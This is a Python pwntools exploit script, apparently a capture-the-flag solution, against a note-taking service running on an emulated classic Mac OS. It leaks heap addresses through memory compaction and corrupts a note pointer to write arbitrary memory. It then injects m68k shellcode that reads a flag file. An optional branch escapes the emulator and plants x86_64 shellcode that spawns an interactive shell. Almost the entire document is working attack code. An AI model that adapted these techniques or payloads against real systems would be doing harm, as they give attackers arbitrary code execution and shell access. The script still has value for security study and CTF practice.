from pwn import *

context.endian='big'

import time
import re
from hexdump import hexdump

SLEEPTIME=.1

def sendlineafter(s, s1, s2):
    s.recvuntil(s1)
    time.sleep(SLEEPTIME)
    s.sendline(s2)

def clr(s):
    s.recvuntil('>')


def create_note(s, content):
    s.sendline('c')
    sendlineafter(s, 'Size: ', f'{len(content)}')
    s.recvuntil('Data: ')
    time.sleep(SLEEPTIME)
    s.send(content)
    clr(s)

def read_note(s, id, no_read=False):
    s.sendline('r')
    sendlineafter(s,'ID: ', f'{id}')
    if no_read is True:
        return
    ret =  s.recvuntil('[')[:-1]
    clr(s)
    return ret


def update_note(s, id, content, clear=True):
    s.sendline('u')
    sendlineafter(s,'ID: ', f'{id}')
    s.recvuntil('Data: ')
    time.sleep(SLEEPTIME)
    s.send(content)
    if clear is True:
        clr(s)


def delete_note(s, id):
    s.sendline('d')
    sendlineafter(s,'ID:', f'{id}')
    clr(s)


N0_LEN = 0x40000
NV_LEN = 0x1000

def main():
    if args.REMOTE:
        s = remote('127.0.0.1', 10201)
    else:
        s = listen(1337)
        s.wait_for_connection()

    clr(s)

    create_note(s, cyclic(N0_LEN))
    create_note(s, cyclic(0x400))
    delete_note(s, 1)


    # force compaction!
    create_note(s, b'\x00' * NV_LEN)

    read_note(s, 0, True)

    data=s.recvuntil('\n>')


    # find memleak: check sanity of recv'd data
    assert data.splitlines()[19][:4] == b'note'

    target_meta = data.splitlines()[15]

    m = re.match(b'.*0x(\w+).*0x(\w+).*0x(\w+)', target_meta)

    #okay, so we know where our memleak is now:
    master_loc = int(m[2], 16)
    data_loc = int(m[3], 16)


    m = re.match(b'.*0x(\w+).*0x(\w+).*0x(\w+)', data.splitlines()[4])
    big_data_ptr = int(m[1], 16)
    data_loc_ptr = int(m[3], 16)+1700

    log.success('big data loc: {:x}'.format(big_data_ptr))

    log.success('victim master_loc: {:x}'.format(master_loc))
    log.success('victim data_loc: {:x}'.format(data_loc))


    idx = data.find(p32(data_loc))

    log.success('victim obj offset: {:d}'.format(idx))

    pwn = data[:idx] + p32(0xdeadbeef) + data[idx+4:N0_LEN]



    # to get this offset: memdump the raw thingy and look for AllocNote.
    # there's a little bit of randomness, but as we overwrite a full page
    # we don't care. We just need to be aligned
    code_1_off = (master_loc - 98000) - 0x400

    cur_ptr = code_1_off

    pwn = data[:idx] + p32(cur_ptr) + data[idx+4:N0_LEN]
    log.info("Sending pwn for 0x{:x}".format(cur_ptr))
    update_note(s, 0, pwn)
    read_note(s, 1, no_read=True)

    victim_data=s.recvuntil('\n>')
    print(hexdump(victim_data))


    codestart = victim_data.find(b'AllocNote')
    assert codestart != -1

    # start at freenote
    codestart += 0x61

    if args.ZAJEBISTY:
        # exploit the emulator
        code = b''
        code += p32(0x4E560000) # link a6, 0
        code += p16(0x4E5E) # unlink

        log.info("Attempt update")

        code = b''


        static_data = 0x781fd000
        jit_ptr = static_data + 0x002ce30
        code += p16(0x207c)      #mov a0
        code += p32(jit_ptr)

        code += p16(0x2250) # mov (a0), a1 -> a1=  *jit       0: data(2): 20 10

        code += p16(0x2009) # move.l    a1,d0
        code += p16(0xe158) # ROL.W #8,D0
        code += p16(0x4840) # SWAP     d0
        code += p16(0xe158) # ROL.W #8,D0
        code += p16(0x2240) # move.l d0,a1

        code += p16(0x207c)      #mov a0 data ptr for node1
        code += p32(data_loc_ptr)

        code += p16(0x2089) # mov a1, (a0)-> *data_loc=  *jit

        code += b'\x4E\x75' # rts

        shellcode = victim_data[:codestart] + code + victim_data[codestart+len(code):NV_LEN]

        update_note(s,  1, shellcode)
        s.sendline('d') # trigger sc in m68k mode -> we have now a ptr to jit in note1


        context.arch = 'x86_64'
        context.endian = 'little'

        sc = asm ( shellcraft.dup2(10, 0) + shellcraft.dup2(10,1) +  shellcraft.sh())
        sc = b'\x90' * ( NV_LEN - len(sc)) + sc

        context.log_level = 'DEBUG'
        update_note(s, 1, sc, clear=False)
        s.interactive()


    else:
        # exploit the challenge: m68k cat flag shellcode
        # this is not stable and uses hard coded constants for volume and file
        # references.

        exploit_data_loc = master_loc + 6432
        lockme = exploit_data_loc - 88152
        exploit_master_pointer_loc = exploit_data_loc - 0x20



        exploit_data = fit( {
            0x00: p32(0),
            0x04: p32(0),
            0x08: p32(0),
            0x0c: p32(0),
            0x10: p16(0),
            0x12: p32(0),
            0x16: p32(0),

            0x42: p32(exploit_data_loc+0xd0),# filename
            0x46: p32(0x8093),# volref

            0x50+0x18: p16(0x86), #0x86 on local, 92 on remote?
            0x50+0x20: p32(exploit_data_loc),
            0x50+0x24: p16(0x40),

            0xd0: b'\x1apapple:Desktop Folder:flag'
        },
            length=0x100, filler= b'\x00'
        )

        create_note(s, exploit_data)


        log.info("assuming exploit_data at {:x}".format(exploit_data_loc))
        log.info("assuming master ptr for data at {:x}".format(lockme))
    ###################

        log.info("Attempt update")

        code = b''

        code += p16(0x207c)      #mov a0
        code += p32( lockme )
        code += p16(0xa029) # hlock. dont move anything


        code += p16(0x207c)      #mov a0
        code += p32(exploit_data_loc)
        code += p16(0xa014) # get volume

        code += p16(0x207c)      #mov a0
        code += p32(exploit_data_loc+0x30)


        code += p16(0x701A )  #moveq   #$1A,d0
        code += p16(0xA060 )  # fsdispatch

        code += p16(0xa000) # open

        code += p16(0x207c)      #mov a0
        code += p32(exploit_data_loc+0x50)

        code += p16(0xa002) # read


        code += b'\x4E\x75' # rts

        shellcode = victim_data[:codestart] + code + victim_data[codestart+len(code):NV_LEN]

        update_note(s,  1, shellcode)

        s.sendline('d') # this triggers our shellcode!
        clr(s)

        flag = read_note(s, 2)
        print(flag)


if __name__ == '__main__':
    main()

